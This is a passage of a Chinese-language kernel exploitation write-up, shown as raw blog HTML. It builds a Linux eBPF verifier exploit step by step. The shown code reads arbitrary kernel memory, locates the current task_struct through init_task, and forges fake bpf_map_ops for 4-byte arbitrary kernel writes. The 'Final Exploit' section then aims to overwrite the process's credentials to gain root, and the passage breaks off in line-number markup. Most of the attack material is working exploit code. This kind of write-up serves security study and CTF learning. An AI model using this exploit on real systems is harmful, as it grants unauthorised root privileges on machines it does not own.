class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .info.bpf_fd = map_fd,<br>        .info.info_len = <span class="hljs-keyword">sizeof</span>(info),<br>        .info.info = (<span class="hljs-type">uint64_t</span>) &amp;info,<br>    &#125;;<br>    <span class="hljs-type">size_t</span> data;<br>    <span class="hljs-type">int</span> ret;<br><br>    ret = run_bpf_prog(prog, <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(prog[<span class="hljs-number">0</span>]), <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-built_in">memset</span>(&amp;info, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(info));<br>    ret = bpf(BPF_OBJ_GET_INFO_BY_FD, &amp;attr);<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    data = info.btf_id;<br><br>    <span class="hljs-keyword">return</span> data;<br>&#125;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">read_arbitrary_addr</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">size_t</span> addr)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> data;<br>    <span class="hljs-type">int</span> key;<br>    <span class="hljs-type">size_t</span> value[<span class="hljs-number">0x1000</span>];<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Loading value into map...&quot;</span>);<br>    key = <span class="hljs-number">1</span>;<br>    value[<span class="hljs-number">0</span>] = addr;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to load value into map!&quot;</span>);<br>    &#125;<br>    key = <span class="hljs-number">2</span>;<br>    value[<span class="hljs-number">0</span>] = addr + <span class="hljs-number">4</span>;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value, <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to load value into map!&quot;</span>);<br>    &#125;<br><br>    data = read_arbitrary_addr_4_bytes(map_fd, <span class="hljs-number">2</span>);<br>    data &lt;&lt;= <span class="hljs-number">32</span>;<br>    data += read_arbitrary_addr_4_bytes(map_fd, <span class="hljs-number">1</span>);<br><br>    <span class="hljs-keyword">return</span> data;<br>&#125;<br></code></pre></td></tr></table></figure><p>不过由于我们目前暂时不知道 <code>page_offset_base</code> ，因此暂时无法完成对所有物理内存搜索的工作，而只能读取内核镜像范围的内存</p><p>但是 <code>init</code> 进程的 PCB <code>init_task</code> 位于内核数据段上，<strong>init_task 的地址对我们来说是可知的</strong>，而<strong>所有进程在内核中的 PCB 构成一个双向链表，因此我们可以直接沿着这个双向链表搜索我们的进程控制块</strong>，判断是否搜索到的方法有很多，比如说对比 pid 一类的，这里笔者选择用 <code>prctl(PR_SET_NAME, &quot;arttnba3&quot;)</code> 来设置 <code>task_struct-&gt;comm</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> current_task;<br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">search_for_current_task</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> next_task = INIT_TASK + kernel_offset + <span class="hljs-number">0x818</span>;<br>    <span class="hljs-type">size_t</span> data;<br><br>    prctl(PR_SET_NAME, <span class="hljs-string">&quot;arttnba3&quot;</span>);<br><br>    <span class="hljs-keyword">do</span> &#123;<br>        next_task = read_arbitrary_addr(map_fd, next_task);<br>        data = read_arbitrary_addr(map_fd, next_task + <span class="hljs-number">0x2d0</span>);<br>    &#125; <span class="hljs-keyword">while</span> (data != *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>);<br><br>    current_task = next_task - <span class="hljs-number">0x818</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Get current task_struct&#x27;s addr: \033[0m%lx\n&quot;</span>,<br>           current_task);<br>&#125;<br></code></pre></td></tr></table></figure><p>成功获得当前进程的 <code>task_struct</code> 地址：</p><p><img src="https://s2.loli.net/2023/06/06/tVo6viTK8C53Y1F.png" alt="image.png"></p><h2 id="五、任意地址写"><a href="#五、任意地址写" class="headerlink" title="五、任意地址写"></a>五、任意地址写</h2><p>我们同时有 map 的地址和内核基址，同时还能直接改写 map 内部的内容，不难想到的是我们可以直接在 map 上构造 fake map ops 后劫持 map 函数表从而劫持内核控制流</p><p>比较传统的方式就是直接栈迁移然后 ROP 执行 <code>commit_cred(&amp;init_cred)</code>，但笔者看到一个非常有意思的构造任意写的思路，所以这里也用这种解法（笑）</p><p>注意到 array map 的 <code>map_get_next_key()</code> 定义如下，当 <code>key</code> 小于 <code>map.max_entries</code> 时 <code>key</code> 会被写入到 <code>next_key</code> 当中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Called from syscall */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">array_map_get_next_key</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>, <span class="hljs-type">void</span> *key, <span class="hljs-type">void</span> *next_key)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_array</span> *<span class="hljs-title">array</span> =</span> container_of(<span class="hljs-built_in">map</span>, <span class="hljs-keyword">struct</span> bpf_array, <span class="hljs-built_in">map</span>);<br>u32 index = key ? *(u32 *)key : U32_MAX;<br>u32 *next = (u32 *)next_key;<br><br><span class="hljs-keyword">if</span> (index &gt;= <span class="hljs-built_in">array</span>-&gt;<span class="hljs-built_in">map</span>.max_entries) &#123;<br>*next = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (index == <span class="hljs-built_in">array</span>-&gt;<span class="hljs-built_in">map</span>.max_entries - <span class="hljs-number">1</span>)<br><span class="hljs-keyword">return</span> -ENOENT;<br><br>*next = index + <span class="hljs-number">1</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>当然对于常规的调用 <code>map_get_next_key()</code> 的流程而言虽然 <code>key</code> 的内容是可控的但是 <code>next_key</code> 指针不是我们所能控制的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">map_get_next_key</span><span class="hljs-params">(<span class="hljs-keyword">union</span> bpf_attr *attr)</span><br>&#123;<br><span class="hljs-comment">//...</span><br>next_key = kmalloc(<span class="hljs-built_in">map</span>-&gt;key_size, GFP_USER);<br><span class="hljs-comment">//...</span><br><br>rcu_read_lock();<br>err = <span class="hljs-built_in">map</span>-&gt;ops-&gt;map_get_next_key(<span class="hljs-built_in">map</span>, key, next_key);<br></code></pre></td></tr></table></figure><p>但是在 map ops 当中有一些函数可以让我们控制这两个参数，<strong>我们可以将这样的函数指针替换为</strong>  <code>map_get_next_key()</code> <strong>从而完成任意地址写</strong>，例如 <code>map_push_elem()</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map_ops</span> &#123;</span><br><span class="hljs-comment">//...</span><br><span class="hljs-type">int</span> (*map_push_elem)(<span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>, <span class="hljs-type">void</span> *value, u64 flags);<br></code></pre></td></tr></table></figure><p>当我们更新 eBPF map 时，若 map 类型为 <code>BPF_MAP_TYPE_QUEUE</code> 或 <code>BPF_MAP_TYPE_STACK</code> ，则这个函数会被调用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bpf_map_update_value</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>, <span class="hljs-keyword">struct</span> fd f, <span class="hljs-type">void</span> *key,</span><br><span class="hljs-params"><span class="hljs-type">void</span> *value, __u64 flags)</span><br>&#123;<br><span class="hljs-comment">//...</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_QUEUE ||<br>   <span class="hljs-built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_STACK) &#123;<br>err = <span class="hljs-built_in">map</span>-&gt;ops-&gt;map_push_elem(<span class="hljs-built_in">map</span>, value, flags);<br></code></pre></td></tr></table></figure><p>不过在我们调用 <code>bpf_map_update_value()</code> 时还有一个检查，若 flags 设置了 <code>BPF_F_LOCK</code> 标志位，则会检查 <code>map-&gt;spin_lock_off</code> 是否大于等于 0，若非则会直接报错返回，因此这里我们还要将该字段改为一个正整数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* flags for BPF_MAP_UPDATE_ELEM command */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>BPF_ANY= <span class="hljs-number">0</span>, <span class="hljs-comment">/* create new element or update existing */</span><br>BPF_NOEXIST= <span class="hljs-number">1</span>, <span class="hljs-comment">/* create new element if it didn&#x27;t exist */</span><br>BPF_EXIST= <span class="hljs-number">2</span>, <span class="hljs-comment">/* update existing element */</span><br>BPF_F_LOCK= <span class="hljs-number">4</span>, <span class="hljs-comment">/* spin_lock-ed map_lookup/map_update */</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> map_value_has_spin_lock(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> bpf_map *<span class="hljs-built_in">map</span>)<br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">map</span>-&gt;spin_lock_off &gt;= <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">map_update_elem</span><span class="hljs-params">(<span class="hljs-keyword">union</span> bpf_attr *attr)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">if</span> ((attr-&gt;flags &amp; BPF_F_LOCK) &amp;&amp;<br>    !map_value_has_spin_lock(<span class="hljs-built_in">map</span>)) &#123;<br>err = -EINVAL;<br><span class="hljs-keyword">goto</span> err_put;<br>&#125;<br><br><span class="hljs-comment">//...</span><br>err = bpf_map_update_value(<span class="hljs-built_in">map</span>, f, key, value, attr-&gt;flags);<br></code></pre></td></tr></table></figure><p>最后我们的任意写方案如下：我们可以在 <code>bpf_array.value</code> 上构造一个 fake ops 将 <code>ops-&gt;map_push_elem</code> 替换为 <code>array_map_get_next_key()</code> ，之后替换掉 map 的函数表，并更改 <code>map.max_entries</code> 为 <code>0xffffffff</code> 、更改 map 类型为  <code>BPF_MAP_TYPE_STACK</code> 、更改 <code>map.spin_lock_off</code> 为正数来实现任意地址写，需要注意的是<strong>单次只能写 4 字节</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAKE_ARBITRARY_WRITE_OPS(__map_fd)          \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* extend the alu_limit */</span>                      \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(0, __map_fd, BPF_REG_7), \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_8, 0x1000),      \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_8),   \</span><br><span class="hljs-meta">        BPF_MOV64_REG(BPF_REG_8, VULN_REG),             \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* overwrite spin_lock_off */</span>                   \</span><br><span class="hljs-meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xE4),         \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_5, 0x2000),               \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),    \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* overwrite max_entries */</span>                     \</span><br><span class="hljs-meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x8),          \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_5, 0xffffffff),           \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),    \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* overwrite map type */</span>                        \</span><br><span class="hljs-meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0xC),          \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_MOV64_IMM(BPF_REG_5, 23),                   \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_W, BPF_REG_7, BPF_REG_5, 0),    \</span><br><span class="hljs-meta">        <span class="hljs-comment">/* overwrite the map-&gt;ops */</span>                    \</span><br><span class="hljs-meta">        BPF_MOV64_REG(VULN_REG, BPF_REG_8),             \</span><br><span class="hljs-meta">        BPF_ALU64_IMM(BPF_MUL, VULN_REG, 0x18),         \</span><br><span class="hljs-meta">        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, VULN_REG),    \</span><br><span class="hljs-meta">        BPF_READ_ARRAY_MAP_IDX(2, __map_fd, BPF_REG_4), \</span><br><span class="hljs-meta">        BPF_LDX_MEM(BPF_DW, BPF_REG_5, BPF_REG_4, 0),   \</span><br><span class="hljs-meta">        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_5, 0)</span><br><br><span class="hljs-type">size_t</span> fake_ops_addr;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">make_arbitrary_write_ops</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">prog</span>[] =</span> &#123;<br>        TRIGGER_VULN(map_fd),<br>        MAKE_VULN_REG(map_fd),<br>        MAKE_ARBITRARY_WRITE_OPS(map_fd),<br>        BPF_EXIT_INSN()<br>    &#125;;<br>    <span class="hljs-type">int</span> key;<br>    <span class="hljs-type">size_t</span> per_ops_ptr, value[<span class="hljs-number">0x1000</span>], value_idx;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map_ops</span> *<span class="hljs-title">ops_data</span>;</span><br><br>    <span class="hljs-comment">/* save fake ops addr into map */</span><br>    fake_ops_addr = map_addr + <span class="hljs-number">0x110</span> + MAP_SIZE;<br><br>    <span class="hljs-comment">/* read ops */</span><br>    value_idx = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> bpf_map_ops); i += <span class="hljs-number">8</span>) &#123;<br>        per_ops_ptr = read_arbitrary_addr(map_fd, map_ops_addr + i);<br>        value[value_idx++] = per_ops_ptr;<br>    &#125;<br><br>    <span class="hljs-comment">/* load ops */</span><br>    ops_data = (<span class="hljs-keyword">struct</span> bpf_map_ops *) value;<br>    ops_data-&gt;map_push_elem = (<span class="hljs-type">void</span>*) (ARRAY_MAP_GET_NEXT_KEY + kernel_offset);<br>    key = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to look up value!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* we&#x27;ll take fake ops&#x27;s addr from map */</span><br>    key = <span class="hljs-number">2</span>;<br>    value[<span class="hljs-number">0</span>] = fake_ops_addr;<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, &amp;key, &amp;value[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to look up value!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* hijack the map */</span><br>    run_bpf_prog(prog, <span class="hljs-keyword">sizeof</span>(prog) / <span class="hljs-keyword">sizeof</span>(prog[<span class="hljs-number">0</span>]), <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">arbitrary_write_4_bytes_by_map</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">size_t</span> addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> val)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> value[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-type">int</span> key;<br><br>    key = <span class="hljs-number">0</span>;<br>    value[<span class="hljs-number">0</span>] = val - <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">return</span> bpf_map_update_elem(map_fd, &amp;key, &amp;value[<span class="hljs-number">0</span>], addr);<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="Final-Exploit"><a href="#Final-Exploit" class="headerlink" title="Final Exploit"></a>Final Exploit</h2><p>最后的 exp 如下，因为在 <code>array_map_get_next_key()</code> 中会检查 <code>index != max_entries - 1</code> ，而 <code>init_cred</code> 的高 32 位必定是 <code>0xFFFFFFFF</code> ，因此这里笔者选择直接改写当前进程的 <code>task_struct.cred</code> 的 uid 与 gid 相关字段：</p><blockquote><p>注：这里笔者将常用函数 &amp; 指令封装在了 <a href="/download/bpf_tools.h">bpf_tools.h</a> 中</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span 